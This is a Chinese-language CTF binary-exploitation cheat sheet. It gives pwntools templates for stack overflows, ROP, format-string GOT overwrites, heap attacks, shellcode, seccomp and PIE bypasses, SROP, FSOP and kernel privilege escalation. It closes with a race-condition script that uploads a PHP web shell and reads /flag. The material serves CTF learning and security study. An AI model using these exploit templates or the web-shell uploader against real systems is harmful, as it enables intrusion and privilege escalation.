# Pwn — 二进制漏洞利用深度参考

## 前置准备

```bash
# 安装
pip install pwntools
# checksec: pwntools 自带
python -c "from pwn import *; print(ELF('./binary'))"

# 工具链
# Ubuntu/Debian: gcc-multilib, gdb-peda
# 本地测试: socat tcp-l:1337,fork exec:./binary,reuseaddr
```

## 保护机制速查 (checksec / pwntools)

| 机制 | 名称 | 影响 | 绕过思路 |
|------|------|------|---------|
| NX (DEP) | 栈不可执行 | shellcode 无法直接执行 | ROP：复用libc/代码段gadget |
| PIE | 地址随机化 (代码段) | 函数/全局变量地址随机 | 先 leak 基址再构造 |
| ASLR | libc/栈/堆随机化 | 返回地址、libc地址随机 | info leak / 爆破partial overwrite |
| Canary (Stack Guard) | 栈cookie | 溢出检测，覆盖会crash | 泄露canary / 逐字节爆破 / 覆盖其他结构 |
| RELRO | GOT只读 | 禁止修改 GOT | 绕过：不写GOT，写其他可写区 |
| Fortify | 编译时安全检查 | 检测危险函数 | 较少影响利用 |

## 栈溢出 (Stack Overflow)

### 基本概念
```
函数栈帧结构（从高地址到低地址）:
[调用者栈帧]
[参数n]
[返回地址]  ← 我们要覆盖的目标
[saved ebp]  ← 可覆盖
[局部变量]  ← 缓冲区起始
```

### 基础利用模式

**1. 直接覆盖返回地址 + ret2text (有后门函数)**
```python
from pwn import *
p = process('./binary')
payload = b'A' * offset  # 到返回地址的偏移
payload += p32(win_addr)  # 或用 p64 在 64位
p.sendline(payload)
p.interactive()
```

**2. ret2syscall (32位)**
```python
# ROPgadget --binary binary --only "pop|ret" | grep "eax"
payload = flat([
    b'A' * offset,
    pop_eax_ret, 11,    # syscall num: execve=11
    pop_ebx_ret, binsh,
    pop_ecx_ret, 0,
    pop_edx_ret, 0,
    int_0x80
])
```

**3. ret2libc / ret2libc without system**
```python
# Step 1: leak libc 地址
# Step 2: 计算 libc_base
# Step 3: 构造 system('/bin/sh')
elf = ELF('./binary')
libc = ELF('./libc.so.6')
libc.address = libc_base
payload = flat([
    b'A' * offset,
    pop_rdi_ret, next(libc.search(b'/bin/sh')),
    libc.symbols['system']
])
```

### 偏移量计算
```python
# 使用 pwntools cyclic
from pwn import *
io = process('./binary')
io.sendline(cyclic(200))
io.wait()
# 查看 crash 地址 → cyclic_find(0x6161616161616161)
# 或者用 gdb pattern create/offset

# IDA 中看 F5 → 函数栈 → Ctrl+K → 看变量到 ebp偏移
# offset = 变量到ebp距离 + 4 (saved ebp)
```

## ROP (Return-Oriented Programming)

### Gadget 查找
```bash
# pwntools
from pwn import *
elf = ELF('./binary')
rop = ROP(elf)
rop.find_gadget(['pop rdi', 'ret'])

# ROPgadget 命令行
ROPgadget --binary binary --only "pop|ret" | grep "rdi"
ROPgadget --binary binary > gadgets.txt
```

### 常用 Gadget 组合
- `pop rdi; ret` — 设置第一个参数 (64位)
- `pop rsi; ret` — 设置第二个参数
- `pop rdx; ret` — 设置第三个参数
- `ret` — 栈对齐 (64位movaps指令要求16字节对齐)
- `leave; ret` — stack pivot
- `int 0x80` / `syscall` — 系统调用

### 64位 vs 32位 传参
| 架构 | 参数传递 |
|------|---------|
| x86 (32位) | 全部在栈上，从右到左压栈 |
| x64 (64位) | rdi, rsi, rdx, rcx, r8, r9, 多余的压栈 |

### ret2csu (通用gadget / __libc_csu_init)
- `__libc_csu_init` 的末尾有通用gadget
- 用于32/64位程序中找不到其他gadget时
- pwntools 直接支持: `ROP(elf).ret2csu(rdi, rsi, rdx, func)`

## 格式化字符串漏洞

### 漏洞原理
```c
printf(user_input);  // ❌ 错误写法
printf("%s", user_input);  // ✅ 正确写法
```

当 `printf(buf)` 的 buf 中含有 `%p %x %n %s` 等时：

| 格式符 | 作用 |
|--------|------|
| `%p` | 泄漏栈上值（指针） |
| `%x` / `%d` | 泄漏栈上值（16进制/10进制） |
| `%n` | **写入**已输出字符数到内存（高危） |
| `%hn` | 写入2字节 |
| `%hhn` | 写入1字节 |
| `%s` | 将参数当字符串地址解引用 |
| `%n$p` | 直接取第n个参数（偏移定位） |

### 常用利用

**1. Leak (泄露地址)**
```python
# 找偏移: 发送 AAAA.%p.%p.%p...
# 找到 AAAA (0x41414141) 的偏移位置
from pwn import *
p = process('./binary')
p.sendline(b'%p.' * 20)
# 数到0x41414141的位置，就是偏移

# Leak canary
payload = b'%17$p'  # 偏移17通常是canary
p.sendline(payload)

# Leak libc
payload = b'%13$p'  # 偏移13可能是__libc_start_main
```

**2. Write (写入任意地址)**
```python
# 小范围修改：改一个int值
# payload = p32(target_addr) + b'%valuec%offset$n'

# 大范围修改：一次写2字节
# 将addr, addr+2, addr+4 的地址写入栈
# 分别用%hn写每2字节
# pwntools: fmtstr_payload(offset, {addr: value})
from pwn import *
payload = fmtstr_payload(offset, {target_addr: target_value})
```

**3. GOT 覆写**
```python
# 将 printf@got → system
# 再次调用 printf 时传入 "/bin/sh"
from pwn import *
payload = fmtstr_payload(offset, {elf.got['printf']: libc.symbols['system']})
```

## 堆利用 (Heap Exploitation)

### 堆基础概念
- **Chunk**: 最小的堆分配单元
  - `prev_size (8B)` | `size (8B)` | `user data`
  - size 最低位: PREV_INUSE
- **bin**: 空闲chunk链表（fastbins, unsorted bin, small bin, large bin）
- **tcache** (glibc 2.26+): 每个线程缓存，最多7个/大小

### 常用攻击
| 攻击 | 原理 | 条件 |
|------|------|------|
| UAF (Use-After-Free) | free后指针未置空 | 可访问free后chunk |
| Double Free | 两次free同一块 | tcache/ fastbin 检测不严 |
| Tcache Poisoning | 修改tcache next指针 | tcache任意分配 |
| Fastbin Attack | 修改fd指针 | fastbin任意地址分配 |
| Unsorted Bin Attack | 修改unsorted bin链表 | 修改libc全局变量 |
| House of系列 | 多种堆风水技术 | 各种特定条件 |

### UAF 基础模板
```python
from pwn import *
# 分配三个chunk
add(0x68, b'A'*8)  # idx 0
add(0x68, b'B'*8)  # idx 1
# 释放0和1
delete(0)
delete(1)
# UAF: 查看释放后还能读
print(show(0))
```

## Shellcode

### 生成shellcode
```python
from pwn import *
# execve("/bin/sh", 0, 0) - 32位
shellcode = asm(shellcraft.sh(), arch='i386')
# 64位
shellcode = asm(shellcraft.amd64.sh(), arch='amd64')
# 自定义
shellcode = asm('''
    xor eax, eax
    push eax
    push 0x68732f2f  # //sh
    push 0x6e69622f  # /bin
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    mov al, 11       # execve
    int 0x80
''')
```

### shellcode 约束
- 不能包含 `\x00`（strcpy截断）
- 长度限制（如 overflow 只有几个字节）
- alphanumeric shellcode（仅字母数字）
- `msfvenom -p linux/x86/exec CMD=/bin/sh -f python`

## 解题流程模板

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'  # 或 'i386'
context.log_level = 'debug'

# 连接
if args.REMOTE:
    r = remote('host', port)
else:
    r = process('./binary')
    # r = gdb.debug('./binary', 'b *0x401234\nc')  # gdb调试

# Leak
r.recvuntil(b'> ')
r.sendline(b'%7$p')
leak = int(r.recvline().strip(), 16)
log.success(f"leaked: {hex(leak)}")

# 计算
libc = ELF('./libc.so.6')
libc.address = leak - libc.symbols['__libc_start_main'] - 128
system = libc.symbols['system']
binsh = next(libc.search(b'/bin/sh'))

# Exploit
rop = ROP(libc)
rop.raw(b'A' * offset)
rop.raw(pop_rdi)
rop.raw(binsh)
rop.raw(ret)  # stack align
rop.raw(system)

r.sendline(rop.chain())
r.interactive()
```

---

## 新增: libc 版本与 gadget 查找

### 确定 libc 版本
```python
# 泄露一个地址后，用 libc-database 查版本
# https://libc.blukat.me/
# https://libc.rip/

# 或用 pwntools
# from pwn import *
# libc = ELF('./libc.so.6')
# 或下载对应版本
```

### 常见 gadget 定位
```python
# 在目标 libc 中查找
from pwn import *
libc = ELF('./libc.so.6')

# pop rdi; ret
pop_rdi = libc.address + next(libc.search(asm('pop rdi; ret')))

# pop rsi; ret
pop_rsi = libc.address + next(libc.search(asm('pop rsi; ret')))

# pop rdx; ret  (libc 较新版本有)
try:
    pop_rdx = libc.address + next(libc.search(asm('pop rdx; ret')))
except:
    # 可能没有 pop rdx
    pass

# ret (用于栈对齐)
ret = libc.address + next(libc.search(asm('ret')))
```

### 单字节 gadget (one_gadget)
```bash
# 安装: gem install one_gadget
# 使用: one_gadget libc.so.6
# 输出类似:
# 0xe3afe execve("/bin/sh", r15, r12)
# 0xe3b01 execve("/bin/sh", r15, rdx)
# 0xe3b04 execve("/bin/sh", rsi, rdx)
```

---

## 新增: 沙箱逃逸 (seccomp)

### 检测 seccomp
```bash
# checksec 会显示 seccomp 状态
# 或: cat /proc/<pid>/status | grep Seccomp
# Seccomp: 2 → 强制模式 (只允许白名单系统调用)
```

### 常用 seccomp 绕过策略
```python
# 1. open + read + write 绕过（最常用）
# 不用 execve，而是:
#    open("/flag", O_RDONLY)
#    read(fd, buf, size)
#    write(1, buf, size)

# 2. ORW (open-read-write) shellcode
from pwn import *

shellcode = asm('''
    /* open("/flag", 0) */
    mov rdi, 0x67616c662f   /* "/flag" */
    push rdi
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 2    /* SYS_open */
    syscall
    
    /* read(fd, buf, 100) */
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 100
    xor rax, rax  /* SYS_read */
    syscall
    
    /* write(1, buf, 100) */
    mov rdx, rax
    mov rdi, 1
    mov rsi, rsp
    mov rax, 1    /* SYS_write */
    syscall
''')
```

### 允许系统调用列表
```
# 常见seccomp白名单:
# read, write, open, openat, close, stat, mmap, brk
# 通常不允许: execve, fork, clone
```

---

## 新增: PIE/ASLR 绕过技巧

### 部分覆盖 (Partial Overwrite)
```python
# 场景: 只覆盖返回地址的低1-2字节
# PIE 随机化只影响高12-18位，低12位固定
# 利用: 只覆盖最低的 1-2 字节 → 跳到附近函数

# 例: 返回地址在 0x55xxx1234
# 覆盖为 0x55xxx1567 → 跳过指令/改变流程
```

### 爆破 PIE
```python
# 场景: fork服务器，每次fork子进程地址相同
# 可多次连接，每次爆破
# 概率: 4位hex (2^12=4096, 实际是2^14~2^17)
# 32位: 约1/8
# 64位: 约1/4096
```

### 栈迁移 (Stack Pivot)
```python
# 场景: overflow很小，不够ROP链
# 利用: 把栈转移到可控区域（如 heap 或 bss）

# 需要 gadget: leave; ret
# leave = mov rsp, rbp; pop rbp
# ret = pop rip

# 流程:
# 1. 用任意写将 ROP 链放到 heap/bss
# 2. 在 overflow 中设置 rbp = heap_addr
# 3. 触发 leave; ret → rsp = heap_addr → ROP链开始执行

payload = b'A' * offset
payload += p64(heap_addr)  # 新 rbp（将作为新栈顶）
payload += p64(leave_ret)  # leave; ret gadget
# 执行后: rsp = heap_addr, 然后 pop rip 从 heap_addr 取值
```

---

## 新增: 内核 Pwn 入门

### 内核模块常见漏洞
```
1. 任意地址读写 (copy_from_user/copy_to_user 未检查)
2. 整数溢出 (size处理不当)
3. 竞争条件 (多线程同时 ioctl)
4. UAF (kmalloc/kfree 后指针未清)
5. 堆溢出 (kmalloc buf 写越界)
```

### 特权提升常用方法
```c
// 1. commit_creds(prepare_kernel_cred(0))
//    获取root权限（提权常用）

// 2. 修改 cred 结构体
//    find task_struct → cred → uid=0

// 3. 修改 modprobe_path
//    触发modprobe调用 → 执行自定义脚本

// 4. MMAP 内核内存
//    映射 /dev/mem → 写入shellcode → 执行
```

---

## 新增: ARM/ARM64 Pwn 要点

```python
# ARM 32位:
# - 参数传递: r0-r3, 多余在栈上
# - 返回: bx lr / pop {pc}
# - 指令长度: 2字节 (thumb) 或 4字节 (arm)

# ARM 64位 (AArch64):
# - 参数传递: x0-x7
# - 返回: ret
# - 栈: 16字节对齐
# - 常见漏洞: 同 x86
```

---

## 新增: 常见Pwn场景速查

### 整数溢出
```python
# 场景: malloc(size) 中 size 来自用户输入
# if (size > 0x100) { exit; }  → size 为负数
# malloc(-1) 实际上分配了 0xFFFFFFFF... 字节 → 失败返回 NULL

# 绕过:
# size = -1 会绕过 >0x100 检查
# 实际 malloc(0xFFFFFFFF) → 失败 → NULL → 后续memcpy写空指针

# 更好的整数溢出:
# size = 0x100, n = 0x10, total = size * n = 0x1000
# 但如果 size * n 溢出，比如 0x100 * 0x101 = 0x10100
# 只分配了0x100字节但写入了0x100*0x101=0x10100字节 → 堆溢出
```

### 格式化字符串写
```python
# 除了泄露，格式化字符串还可用于任意地址写
# %n: 写入已输出字符数
# %hn: 写入2字节
# %hhn: 写入1字节

# 写入 p64(target_addr) + b'%XXXc%YYY$hn'
# XXX = target_value (要写入的值)
# YYY = 偏移量

def fmt_write(addr, value, offset, size='short'):
    """
    格式化字符串任意写
    addr: 目标地址
    value: 要写入的值
    offset: 格式化字符串参数偏移
    size: 'byte', 'short', 'int'
    """
    payload = b''
    if size == 'byte':
        payload += p64(addr)
        payload += b'%' + str(value).encode() + b'c%' + str(offset).encode() + b'$hhn'
    elif size == 'short':
        payload += p64(addr)
        payload += b'%' + str(value).encode() + b'c%' + str(offset).encode() + b'$hn'
    return payload
```

---

## 标准解题流程
```
拿到 binary
  ↓ file + checksec（架构、保护、seccomp）
  ↓ IDA/Ghidra 分析
  ↓ 定位漏洞点
  │
  ├── 栈溢出
  │   ├── ret2shellcode (NX=off)
  │   ├── ret2libc (ASLR) → leak → system("/bin/sh")
  │   ├── ret2syscall (有gadget)
  │   ├── ROP链 (复杂控制流)
  │   └── SROP (sigreturn)
  │
  ├── 格式化字符串
  │   ├── %p 泄露地址
  │   ├── %n 任意写 GOT
  │   └── pwntools fmtstr_payload
  │
  ├── 堆利用
  │   ├── tcache → tcache dup → poison
  │   ├── fastbin → fastbin dup
  │   ├── unsorted bin → leak libc
  │   └── House of XXX
  │
  └── 其他
      ├── 整数溢出 → 转其他漏洞
      └── 逻辑错误 → 直接调用后门函数
  ↓
  构造 exp → 本地测试 → 远程打

---

## SROP (Sigreturn-Oriented Programming)（新增V4）

```python
from pwn import *
context.arch = 'amd64'

# SigreturnFrame → 任意寄存器控制!
frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = bin_sh_addr      # "/bin/sh"
frame.rsi = 0; frame.rdx = 0
frame.rip = syscall_addr

payload = b'A' * offset + p64(syscall_ret) + bytes(frame)

# ORW frame (绕过 seccomp):
frame.rax = constants.SYS_open   # open("/flag", 0)
frame.rdi = flag_addr
frame.rip = syscall_addr  # 然后链到 read+write

# UTF-8 约束 → 双SROP: 先设置部分寄存器, 再次sigreturn完成链
```

---

## Windows Pwn（新增V4）

### SEH Overwrite (32位)
```python
# SEH链: fs:[0] → 下一处理函数 → 覆盖handler → 异常触发EIP控制
# 关键gadget: POP+POP+POP+RET (PE中很常见)
# VirtualAlloc(addr,size,MEM_COMMIT,PAGE_EXECUTE_READWRITE) + memcpy + jmp
```

### CFG Bypass (Control Flow Guard)
```python
# CFG验证间接调用目标 → system()是kernel32中的合法目标
# ROP: setup rcx → "cmd /c TYPE C:\\flag.txt" → call system
```

---

## House of 系列堆攻击 + FSOP（新增V4）

| House | 核心原理 | 利用条件 |
|-------|---------|---------|
| **Apple 2** | IO_FILE vtable劫持 → FSOP | 修改_IO_list_all |
| **Einherjar** | chunk合并偏移攻击 | prev_size可控 |
| **Orange** | unsorted bin attack + FSOP | TOP chunk限制 |
| **Spirit** | 伪造chunk释放 | fake fastbin chunk |
| **Force** | TOP chunk size改写 | 可控TOP chunk |
| **Lore** | small bin corrupt | 可控small bin指针 |

### FSOP (File Stream Oriented Programming)
```python
# glibc 2.24+: vtable限制在合法范围
# 滥用: _IO_str_overflow / _IO_wstr_overflow (合法vtable内!)
from pwn import *
fake_file = FileStructure()
fake_file.flags = u64(b'/bin/sh\x00')
fake_file._IO_write_ptr = 1
fake_file.vtable = libc.symbols['_IO_str_jumps']
# _IO_str_overflow → 调用 fake_file+0xE0 → 控制RIP
```

---

## ret2dlresolve（新增V4）

```python
from pwn import *
elf = ELF('./binary')
rop = ROP(elf)
dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])
rop.read(0, dlresolve.data_addr)  # 写伪造reloc/sym/str表
rop.ret2dlresolve(dlresolve)      # 触发解析→调用system("/bin/sh")
# 条件: No RELRO (got.plt可写)
```

---

## Blind Pwn / 侧信道泄露（新增V4）

```python
# 逐字节爆破 (crash/no-crash oracle):
def byte_leak(oracle_func, flag_len=32):
    known = b''
    for pos in range(flag_len):
        for guess in range(32, 127):
            test = (known + bytes([guess])).ljust(flag_len, b'A')
            if not oracle_func(test):
                known += bytes([guess])
                break
    return known

# Fork服务器canary爆破: 256*8最多=2048次
# CRC oracle as arbitrary read: CRC32线性的→GF(2)高斯消元恢复任意字节
```

---

## Kernel Exploitation 进阶（新增V4）

### SLUB Allocator 绕过
```python
# CONFIG_SLAB_FREELIST_HARDENED:
# freelist_ptr = ptr ^ (swab(ptr_addr) ^ random)
# 需要先 leak random → info leak获取
```

### modprobe_path 覆写
```python
# 内核调用 /sbin/modprobe 处理未知文件格式
# 覆盖modprobe_path → 以root执行自定义脚本
# strcpy(modprobe_path, "/tmp/pwn.sh")
# 写入: cp /flag /tmp/f → 触发未知格式 → root执行
```

---

## Race Condition 专项（新增V4）

```python
import threading, requests

def race_upload_access(url, upload_path, shell_path):
    found = threading.Event()
    def upload():
        while not found.is_set():
            requests.post(url+upload_path,
                files={'file':('x.php',b'<?php system($_GET["c"]);?>')})
    def access():
        while not found.is_set():
            r = requests.get(url+shell_path+'?c=cat /flag')
            if 'flag{' in r.text:
                print(f"FLAG: {r.text}"); found.set()
    [threading.Thread(target=f).start() for f in (upload,access) for _ in range(20)]

# TCP竞态: 多个连接同时发送 → 利用认证前时间窗口
# TOCTOU: symlink(legit,target) → unlink → symlink(/flag,target) → 竞速
```
```
